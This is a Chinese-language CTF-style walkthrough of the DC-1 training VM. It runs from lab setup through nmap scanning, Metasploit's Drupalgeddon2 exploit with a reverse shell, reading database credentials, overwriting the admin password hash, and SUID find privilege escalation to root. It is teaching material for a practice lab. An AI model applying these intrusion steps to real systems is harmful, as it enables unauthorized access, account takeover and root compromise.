​	

## 前置工具及安装

**VmwareWorkstation** 推荐16pro版

~~~
https://www.vmware.com/cn/products/workstation-pro/workstation-pro-evaluation.html
~~~

**虚拟机**

Centos7 镜像下载地址：

http://mirrors.aliyun.com/centos/7/isos/x86_64/ 

推荐下载Contos7的标准安装版：CentOS-7-x86_64-DVD-2003.iso

Kali虚拟机下载地址：

https://www.kali.org/downloads/

下个64位的installer版吧。

——最好至少留有60G空间给Kali，这东西越用越瘾的0.0

这是VMware 14 的Centos7的安装参考：

​	https://blog.csdn.net/Rao_Limon/article/details/83311095

这是VMware 14 的Kali的安装参考：

​	https://www.geek-share.com/detail/2789583020.html  

Kali的处理器数最好留多一些，因个人情况而定吧。

***\**在成功进入桌面后，记得把快照拍了：\****

![img](DC-1通关手册.assets/wps1.jpg) 



**配置虚拟机网络：**

虚拟机网络有三种方式，分别是NAT模式、桥接模式以及仅主机模式，各个模式的特点简单来说如下：

NAT模式以主机作为虚拟机的网关，虚拟机依靠主机可以访问外网，但无法与和主机处于同一网段的其他真实机子通讯，主机可以与虚拟机通讯。

桥接模式则是虚拟机和主机同属一个网段上，也就类似于虚拟机相当于主机同一网段上的独立主机了，虚拟机的IP是真实的主机所在的网段上的IP，因此可以和其他机子包括主机通讯，意味着是通过和主机所使用的相同的路由器访问外网。

主机模式则与上边两种模式截然不同，主机模式仅虚拟机之间、虚拟机和主机可以相互通讯，和外网完全是隔离的状态，也就是说虚拟机无法访问外网，也无法与处于和主机同一网段上的其他真实主机通讯，通讯仅限于主机范围内。

一般来说VMware在装虚拟机时都会自动帮配好网络，只需要选择NAT或者桥接模式，虚拟机就可以访问外网了，这里是学习如何更自由的配置虚拟机网络。

Centos7网络配置参考：

https://blog.csdn.net/qq_32352777/article/details/86561289

Kali网络配置参考：

​	https://blog.csdn.net/Hardlearn_bobo/article/details/78851833

——最好将两台虚拟机网络设置在同一网段。



对于渗透测试，此处推荐使用Kali虚拟机

**Kali安装VMwaretools的简单步骤**

1.	虚拟机选项卡 → 安装VMware Tools

2.	打开在Kali中新出现光驱，把tar.gz后缀的压缩包复制到自己的用户主目录

3. 进入主目录，右键点击压缩包，选择提取到此处

4.	打开解压好的目录，在文件管理器空白处，点击右键，选择在终端打开

5.	输入 “./vm” ，然后按下tab键，待自动补全后按回车就行了

**安装VMwaretools目前阶段只适用于方便地直接将本机文件拖入虚拟机中。看自己需求选择安装**



**配置SSH连接虚拟机**

~~~
kali:https://www.cnblogs.com/061713xlhj/p/10726799.html
~~~

~~~
centos:https://blog.csdn.net/trackle400/article/details/52755571
~~~







## DC-1靶机安装和设置

DC-1靶机相当于一个主机，内置有5个flag作为提示和渗透成功的证明。

安装好Vmwareworkstation并且激活之后，下载DC-1压缩包并解压。

![image-20211031134019070](DC-1通关手册.assets/image-20211031134019070.png)

直接用Vmwareworkstation打开

![image-20211031134059049](DC-1通关手册.assets/image-20211031134059049.png)

选择储存路径并导入

![image-20211031134115299](DC-1通关手册.assets/image-20211031134115299.png)

一般此处会提示导入失败，重试即可

![image-20211031134253670](DC-1通关手册.assets/image-20211031134253670.png)

配置靶机网络，为保证对靶机的渗透测试可以正常顺利进行，要将靶机放于同一个局域网下，所以要设置NAT模式

![image-20211031134351589](DC-1通关手册.assets/image-20211031134351589.png)

选择这个，之后点击确定，并开启此虚拟机

![image-20211031134427325](DC-1通关手册.assets/image-20211031134427325.png)

选择 是 即可

等待启动

![image-20211031134517563](DC-1通关手册.assets/image-20211031134517563.png)

如图所示，即靶机启动成功，则可使用虚拟机作为攻击机，对目标靶机进行渗透测试



## DC-1渗透测试

### 信息收集

打开Kali虚拟机(root权限)

这里演示时使用的工具是Xshell，如果没有配置SSH，在Kali中使用终端操作是一样的。

![image-20211031134812688](DC-1通关手册.assets/image-20211031134812688.png)

首先进行主机发现，由于靶机与虚拟机属于同一C段下，所以考虑使用nmap拿到靶机的ip地址。

使用ifconfig命令，拿到这台虚拟机的内网ip，通常是eth0对应的inet地址

![image-20211031135036491](DC-1通关手册.assets/image-20211031135036491.png)

由于靶机与虚拟机处于同一c段，所以只需要扫描位于同一c段的主机，就可以进行主机发现。

可以简单理解为，虚拟机ip为192.168.10.131，而靶机ip为192.168.10.XXX，现在需要找到靶机的ip地址

使用命令 

~~~
nmap -sP ip/24 -oN nmap.sP
~~~

![image-20211031135133970](DC-1通关手册.assets/image-20211031135133970.png)

![image-20211031135406057](DC-1通关手册.assets/image-20211031135406057.png)

其中 -sP参数表示使用ping扫描, -oN是写入到其后的文件，在此条命令中表示将结果写入nmap.sP中，ip/24表示该ip下的所有c段

从扫描结果得知，该靶机的ip地址为192.168.10.142 (不同环境对应的ip不同，只是我的主机对应着192.168.10.142，所以本文中所有写着192.168.10.142的地方，要根据自己本机电脑情况选择ip替换)

进行下一步的信息收集，要查看靶机开放了什么端口，端口上运行了什么服务，以便后续有针对性的进行渗透计划。

此处同样使用nmap工具，命令为

~~~
nmap -A 靶机ip -oN nmap.A
~~~

-A参数表示全面扫描，通常对单个ip地址使用，同时-oN将结果写入nmap.A中

![image-20211031140426945](DC-1通关手册.assets/image-20211031140426945.png)

此处表示靶机开放了22端口，上面运行着ssh服务

![image-20211031140719343](DC-1通关手册.assets/image-20211031140719343.png)

此处表示靶机开放了80端口，上面运行着http服务，同时80端口一般对应着web页面，一般来说，如果没有经过特别配置，直接使用访问ip地址即可访问到该主机对应的http服务。简单来说，就是靶机开放了一个web页面，在浏览器直接输入该ip即可访问。nmap还扫出来一些信息，比如该网站使用了Drupal 7框架，存在robots.txt文件，使用了Apache/2.2.22等信息

![image-20211031140743602](DC-1通关手册.assets/image-20211031140743602.png)	

此处表示开放111端口，该端口存在漏洞但并未验证，也并非本次渗透测试的攻击方向，想了解相关服务内容和漏洞验证及漏洞利用方法的，可以自己去查一下（我也不会）

![image-20211031141129273](DC-1通关手册.assets/image-20211031141129273.png)



## 漏洞探测

由于靶机开放了22端口和80端口，对于22端口上的ssh服务，如果不知道用户名和密码，尝试爆破是一件很繁琐且效率很低的方法，所以考虑从网页入手。

使用浏览器访问该ip对应的web页面

![image-20211031141529735](DC-1通关手册.assets/image-20211031141529735.png)

![image-20211031141542751](DC-1通关手册.assets/image-20211031141542751.png)

使用Wappalyzer插件发现，以及刚刚nmap中扫出来的信息提示，该网站的建站系统为Drupal 7。第一思路为去网上找有没有drupal 7的漏洞利用方式。

![image-20211031141749573](DC-1通关手册.assets/image-20211031141749573.png)

可以看到有很多关于drupal 7的漏洞，推荐有兴趣的同学可以根据上面的教程手工利用，合理使用搜索引擎复现利用nday漏洞也是一项很重要的技能，并且由于drupal的最新版本应该为11左右，所以对于drupal 7 肯定会有多个可以利用的漏洞。

这里更多出于介绍的目的，使用一款新的工具metasploit

## 获取webshell(shell)

**使用命令msfconsole**

![image-20211031142037618](DC-1通关手册.assets/image-20211031142037618.png)

metasploit这款工具非常强大，同时拥有许多功能、内置了许多脚本，短短的一篇介绍不完，但是工具终究是工具，熟练使用工具很重要，但是渗透的思路和手工尝试更重要。此处只是出于介绍目的介绍工具，并不希望大家依赖工具，不然只能成为一个脚本小子。

说回正题，尝试在metasploit里查找有没有相关的利用脚本。

使用命令

~~~
search drupal 7
~~~

此处搜索到以下几个模块，通过模块名字和Rank的综合分析，可以尝试考虑使用第0或第1个，由于我测试过第0个无法使用，故演示只演示第一个

![image-20211031142759755](DC-1通关手册.assets/image-20211031142759755.png)

使用命令来使用该模块

~~~
use exploit/unix/webapp/drupal_drupalgeddon2
~~~

![image-20211031143316570](DC-1通关手册.assets/image-20211031143316570.png)

使用命令来进行参数设置

~~~
show options
~~~

![image-20211031143329551](DC-1通关手册.assets/image-20211031143329551.png)

对于Required为yes的项都需要设置才能使用，此处设置RHOSTS为目标靶机ip

使用命令

~~~
set RHOSTS 192.168.10.142
~~~

![image-20211031143501598](DC-1通关手册.assets/image-20211031143501598.png)

使用命令exploit 启动

~~~
exploit
~~~

可以看到已经攻击成功，已经建立了一个meterpreter会话，可以理解为建立了一个反弹shell

![image-20211031144009034](DC-1通关手册.assets/image-20211031144009034.png)

使用命令

~~~
shell
~~~

进入shell中，并尝试使用几个命令

![image-20211031144512068](DC-1通关手册.assets/image-20211031144512068.png)

但这个shell并不是一个交互式shell，对于后续的渗透测试很不方便，我们需要将这个shell变为交互式shell，关于交互式shell和非交互式shell的不同，还是希望大家能自己手动查查。

由于使用python -v发现靶机上装了python2.7，则考虑可以使用python中的命令来唤出交互式shell

![image-20211031144904175](DC-1通关手册.assets/image-20211031144904175.png)

先按下Ctrl+Z强制结束当前的shell,输入y确定

回退到meterpreter会话

再输入命令进入到非交互式shell

~~~
shell
~~~

再使用python使用交互式shell

~~~
python -c 'import pty;pty.spawn("/bin/bash")'
~~~

![image-20211031145515760](DC-1通关手册.assets/image-20211031145515760.png)

输入命令

~~~
ls
~~~

查看该目录下的文件

![image-20211031145633167](DC-1通关手册.assets/image-20211031145633167.png)

可以看到flag1.txt

查看一下该文件

使用命令

~~~
cat flag1.txt
~~~

![image-20211031145757831](DC-1通关手册.assets/image-20211031145757831.png)

文件中提示，每一个CMS都需要一个config file，则提示我们要去找这个config file，可能下一个flag会在那个地方

首先考虑当前目录下的这个web.config

cat一下看看

~~~
cat web.config
~~~

发现并没有任何有价值的东西，则考虑去其他文件目录下找

直接去网上搜drupal的文件结构 发现3.6 sites文件夹中有一个配置文件setting.php 则尝试去看看

![image-20211031150311736](DC-1通关手册.assets/image-20211031150311736.png)

使用命令

~~~
ls
cd sites
ls
cd default
ls
~~~

![image-20211031150356548](DC-1通关手册.assets/image-20211031150356548.png)

看一下settings.php

~~~
cat settings.php
~~~

![image-20211031150451186](DC-1通关手册.assets/image-20211031150451186.png)

可以看到flag2以及mysql数据库的配置文件

flag2提示道：不要尝试字典爆破

此处他给了我们mysql的配置文件，那我们干脆就尝试登陆一下mysql

使用命令

~~~
mysql -udbuser -pR0ck3t
~~~

![image-20211031150632304](DC-1通关手册.assets/image-20211031150632304.png)

登陆到mysql，看看数据库有没有什么敏感信息

使用命令

~~~
show databases;
~~~

![image-20211031150718312](DC-1通关手册.assets/image-20211031150718312.png)

~~~
use drupaldb;
show tables;
~~~

![image-20211031150821180](DC-1通关手册.assets/image-20211031150821180.png)

拉到最下面可以看到 此处有一张表名为users,一般名为users的表都存着敏感信息，查看一下这张表。

使用命令

~~~
select * from users;
~~~

考虑到显示不太好看 使用\G参数

~~~
select * from users \G;
~~~

![image-20211031151015433](DC-1通关手册.assets/image-20211031151015433.png)

可以看到该表中存放着admin的敏感信息，猜测可能是用于网站后台的登录，但密码却经过了加密。

由于flag2中提示我们不要尝试着去暴力破解，既然我们没有办法得到它的密码，但由于我们拥有数据库的权限，可以考虑将我们已知的密码加密之后覆盖原来的密码，就可以将我们已知的密码拿来登录，接下来的思路便是，如何加密。

直接去google一下drupal的用户密码是如何加密的

![image-20211031151359642](DC-1通关手册.assets/image-20211031151359642.png)

查找到这篇文章 发现scripts下有一个加密脚本，可以直接使用

先退出mysql

使用命令

~~~
exit
~~~

~~~
php scripts/password-hash.sh 123 >password.txt
~~~

~~~
cat password.txt
~~~

拿到加密后的密码

~~~
$S$DkN.RoKXZxoV58CBBB6ffl/FcI79v.iXXsAFeAPPwiS6OHvBkBR1
~~~

![image-20211031153331795](DC-1通关手册.assets/image-20211031153331795.png)

接下来拿这行密码去替换mysql中的admin的密码

进入mysql

使用命令

~~~
mysql -udbuser -pR0ck3t
~~~

~~~
use drupaldb;
update users set pass='$S$DkN.RoKXZxoV58CBBB6ffl/FcI79v.iXXsAFeAPPwiS6OHvBkBR1' where uid=1;
~~~

重新再查一下发现修改成功![image-20211031153742026](DC-1通关手册.assets/image-20211031153742026.png)

尝试用这个用户登录

![image-20211031153846492](DC-1通关手册.assets/image-20211031153846492.png)

登陆成功，此时相当于拿到网页后台权限。按照一般的渗透流程，可以考虑先拿webshell，再拿真正主机的shell，此处由于靶机设计原因情况比较特殊，但无论如何渗透思路多种多样，只要拿到权限就是成功。

![image-20211031154036356](DC-1通关手册.assets/image-20211031154036356.png)

随便点一点发现此处存在flag3

![image-20211031154146140](DC-1通关手册.assets/image-20211031154146140.png)

### 提权

根据flag3中提到的关键词 perms find passwd -exec ，无论是正常的渗透测试流程，还是此处给出的提示，都在指引我们走向提权。

此处flag提示的意义在于，它想让我们去读取/etc/passwd，但事实上这个文件需要root权限才能读取，而我们只是一般的普通用户权限，故此处考虑提权。

提权的方式有很多，此处根据靶场设计来提权，由于提示了perm，则考虑使用具有suid的命令来提权

什么是suid suid的命令为什么可以提权 需要大家自行百度

对于拥有suid的命令来说，它最显而易见的特点是，使用该命令时，执行命令的权限为文件拥有者的权限，而不是使用命令者的权限。

使用命令查找具有这样特点的命令

~~~
find / -perm -4000
~~~

![image-20211031154941141](DC-1通关手册.assets/image-20211031154941141.png)

发现find拥有这样的特点 而find中的参数-exec 可以执行其后跟随的命令

于是我们精心构造一个命令，通过拥有root权限的find来启用一个shell

使用命令

~~~
find password.txt -exec '/bin/sh' \;
~~~

password.txt最好为一个可以找到的文件，因为刚刚在密码那个环节生成了一个password.txt，所以此处就选择了password.txt，但此处没有特殊含义，任何一个在该目录存在下的文件都可以放这，重点在于-exec后跟着的命令

执行/bin/sh 可以粗略地认为这时启动了一个shell 随后的反斜杠是因为考虑不同系统间可能存在符号不一致进行的转义。![image-20211031155441201](DC-1通关手册.assets/image-20211031155441201.png)

得到root权限

查看一下/etc/passwd  

~~~
cat /etc/passwd
~~~

发现没什么东西

看一下/etc/shadow

为什么看/etc/shadow需要大家自行了解这两个文件的关系

~~~
cat /etc/shawdow
~~~

![image-20211031155805283](DC-1通关手册.assets/image-20211031155805283.png)

发现flag4，并且其后有加密过的密码

靶场设计思路是让我们去爆破这个密码，此处可以使用hydra工具，大家可以尝试去使用。

但事实上我们此处已经拥有了root权限，要去找flag4这个用户的密码就很无聊，直接去找flag4就可以了

使用命令

~~~
find / -name flag4*
~~~

该命令表示 搜索根目录(/)下的所有文件 -name参数表示符合其后内容的文件名

*为linux中的通配符 此处可以理解为任意字符任意数量

即flag4.lsjyyds flag4.lsjsb 都可以匹配到

![image-20211031160552116](DC-1通关手册.assets/image-20211031160552116.png)

可以直接找到flag4.txt

cat一下

![image-20211031160625737](DC-1通关手册.assets/image-20211031160625737.png)



他说我们可以用同样的方法来得到/root下的flag

那既然我们已经是root权限了，

使用命令

~~~
cd /root
ls
cat thefinalflag.txt
~~~

![image-20211031160807052](DC-1通关手册.assets/image-20211031160807052.png)

至此，你已拿到这台主机的root权限，对于单个靶机的渗透测试也就告一段落。但在事实的生产环境中，如果这台主机还连接了其他的内网服务，还可以使用一些特别的技巧使这台主机当做类似跳板，来完成对其他内网服务的访问以及再渗透测试。此次渗透测试的主要目的还是配置一下虚拟机，了解靶场的安装，熟悉一些简单的linux命令，比如cd ls pwd cat等等，以及几款工具如metasploit,hydra,nmap的基本使用，还有一些比较常规的渗透思路。如果你已成功的通过自己努力复现本次靶机的渗透测试并且拿到最后的flag，那么恭喜你已经逐渐开始入门，并且已经拥有独立解决问题的能力了。

# __end__

